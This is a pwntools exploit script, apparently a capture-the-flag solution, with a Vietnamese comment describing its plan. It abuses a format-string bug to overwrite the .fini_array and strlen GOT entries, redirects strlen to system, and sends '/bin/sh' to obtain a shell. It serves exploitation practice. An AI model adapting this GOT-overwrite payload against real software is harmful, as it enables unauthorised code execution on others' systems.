from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x8048695
b* 0x804864f
continue
'''.format(**locals())

#Binary filename
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

'''
wow bai nay tap trung vao loi FormatString, sau khi printf xong thi chuong trinh
se ket thuc, vi vay t hijack GOT luc return cua ham main quay lai ham main, khi
return ham goi den ham init_array do do t FmS ham nay
ben canh do stolen trong Func Nao thanh system la xong >>> dep

'''

fini_got = 0x8049934
main_addr = 0x80485ED
strlen_got = 0x8049a54
system_plt = 0x8048490


p.recvuntil(b"Please tell me your name... ")
payload = b"a"*2
payload += p32(strlen_got+2)
payload += p32(strlen_got)
payload += p32(fini_got)
print(len(payload))
payload += f"%{0x804 - 32}c%12$hn".encode() # 32 = (Nice to meet you, ) = 18 + 12 (func) + 2
payload += f"%{0x8490-0x804}c%13$hn".encode()
payload += f"%{0x85ed-0x8490}c%14$hn--".encode()

p.sendline(payload)

p.sendline("/bin/sh")
p.interactive()
